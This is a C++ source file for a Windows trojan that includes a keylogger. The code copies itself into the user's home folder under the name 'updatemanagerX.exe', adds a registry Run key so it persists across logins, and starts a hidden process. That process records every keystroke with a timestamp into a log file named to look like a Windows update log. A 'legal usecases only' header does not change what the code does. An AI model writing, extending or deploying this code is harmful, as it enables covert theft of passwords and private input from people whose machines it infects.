/*
 * <c> Sharkbyteprojects
 * LEGAL USECASES ONLY
 */
#include <windows.h>
#include <future>
#include <vector>
#include <string>
#include "trojan.h"
#include <fstream>
#include <memory>
#include <ctime>
#include <filesystem>

 //GUID THAT MALWARE RUNS ONLY ONE INSTANCE
#define appguid "{1b885a21-ddce-4300-b2ba-d586680f6942}"

struct elem {
	char e;
	bool t;
	std::string elemt;
	elem(char ew, bool tw, std::string elemtw) :e(ew), t(tw), elemt(elemtw) {};
};

class hephistusMD {
private:
	std::ofstream* i;
	std::vector<elem> di;
public:
	bool gks(char e) { return GetKeyState(e) & 0x8000; }
	void hephistus(char begin, char end) {
		char xt[]{ 0x00,'\0' };
		for (char x = begin; x <= end; x++) {
			xt[0] = x;
			di.push_back(elem(x, gks(x), std::string(xt)));
		}
	}
	void add(char x, std::string s) {
		di.push_back(elem(x, gks(x), s));
	}
	void run() {
		bool c = 0;
		for (size_t e = 0; e < di.size(); e++) {
			c = gks(di[e].e);
			if (di[e].t != c) {
				std::time_t result = std::time(nullptr);
#pragma warning(suppress : 4996)
				char* t = std::asctime(std::localtime(&result));
				t[strlen(t) - 1] = '\0';
				(*i) << t << ";" << di[e].elemt << ";" << (c ? "Down" : "Up") << std::endl;
			}
			di[e].t = c;
		}
	}
	hephistusMD(std::ofstream* d) :i(d) {}
};

bool shouldClose();
void malwareDeamon(std::string w) {
	if (shouldClose())
		return;

	std::ofstream ofile(
		(w + "win_update_r.log").c_str(), std::ios_base::app | std::ios_base::out);
	hephistusMD m(&ofile);

	m.hephistus(0x30, 0x39);//0-9
	m.hephistus(0x41, 0x5a);//A-Z
	m.add(VK_TAB, "TAB");
	m.add(VK_BACK, "Backspace");
	m.add(VK_RETURN, "Newline");
	m.add(VK_SHIFT, "Shift");
	m.add(VK_CONTROL, "CTRL");
	m.add(VK_MENU, "Alt");
	m.add(VK_HOME, "WinKey");
	m.add(VK_SNAPSHOT, "Snapshot");
	m.add(VK_DELETE, "Delete");
	m.add(VK_SEPARATOR, "Seperator");
	m.add(VK_SUBTRACT, "-");
	m.add(VK_DECIMAL, "Decimal");
	m.add(VK_SPACE, "Spacebar");
	//ADD ADDITIONAL KEYS HERE WITH m.add(keycode, "Description") or a ASCII range with m.hephistus(start, end);
	//KEYCODES: https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

	while (1) {
		m.run();//RUN KEYLOG CHECKER
		//EXIT KEYLOGGER:
		if (m.gks(VK_F8)) break;
		Sleep(1);
	}
	ofile.close();
}

char* abso(const char* x, size_t* sp = nullptr);

int main(int argc, char* argv[])
{
	bool Persist = true;
	if (argc > 1 && std::string(argv[1]) == "/0")
		Persist = false;
	std::string home;
	{
#pragma warning(suppress : 4996)
		char* hd = getenv("HOMEDRIVE"),
#pragma warning(suppress : 4996)
			* hp = getenv("HOMEPATH");
		home = (hd == NULL || hp == NULL) ? ".\\" : std::string(hd) + "\\" + hp + "\\";
	}
	const char* agv[]{ "hephistus", "run" };
	if (argc > 2 && std::string(argv[2]) == agv[1] && std::string(argv[1]) == agv[0]) {
		malwareDeamon(home);
		return 0;
	}
	std::future<int> fut = std::async(om, argc, argv);
	{
		std::string a(argv[0]);
		bool cp = false;
		if(Persist) {
			std::string nf = home + "updatemanagerX.exe";
			if (!std::filesystem::exists(nf)) {
				char* tld2 = abso(a.c_str());
				if (tld2 == nullptr) goto skip2;
				if (CopyFileA(tld2, nf.c_str(), FALSE) != 0) {//TRY TO COPY
					a = nf;
					cp = true;
				}
				free(tld2);
			skip2:
				__nop();
			}
		}
		std::string codec = (a + " " + agv[0] + " " + agv[1]);
		size_t s = sizeof(char) * (1 + codec.length());
		char* tld = (char*)malloc(s);
		if (tld == nullptr) goto skiphephistus;
		strcpy_s(tld, s, codec.c_str());

		if (cp&&Persist) {
			HKEY k;
			LSTATUS x = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, KEY_WRITE, &k);
			if (x == ERROR_SUCCESS) {
				size_t s2 = 0;
				char* tld2 = abso(tld, &s2);
				if (tld2 == nullptr) goto skip4;
				x = RegSetValueExA(k, appguid, NULL, REG_SZ, (const BYTE*)tld2, s2);
				free(tld2);
			skip4:
				RegCloseKey(k);
			}
		}

		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		if (!CreateProcessA(NULL,   // No module name (use command line)
			tld,        // Command line
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi)           // Pointer to PROCESS_INFORMATION structure
			) malwareDeamon(home);
		free(tld);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
skiphephistus:
	return fut.get();
}

bool shouldClose() {
	//Make sure at most one instance of the tool is running
	HANDLE hMutexOneInstance(::CreateMutexA(NULL, TRUE, appguid));
	bool bAlreadyRunning((::GetLastError() == ERROR_ALREADY_EXISTS));
	if (hMutexOneInstance == NULL || bAlreadyRunning)
	{
		if (hMutexOneInstance)
		{
			::ReleaseMutex(hMutexOneInstance);
			::CloseHandle(hMutexOneInstance);
		}
		return true;
	}
	return false;
}

char* abso(const char* x, size_t* sp) {
	std::string m = std::filesystem::absolute(x).string();
	size_t s2 = (1 + m.size()) * sizeof(char);
	char* tld2 = (char*)malloc(s2);
	if (tld2 == nullptr) return nullptr;
	strcpy_s(tld2, s2, m.c_str());
	if (sp != nullptr)
		*sp = s2;
	return tld2;
}
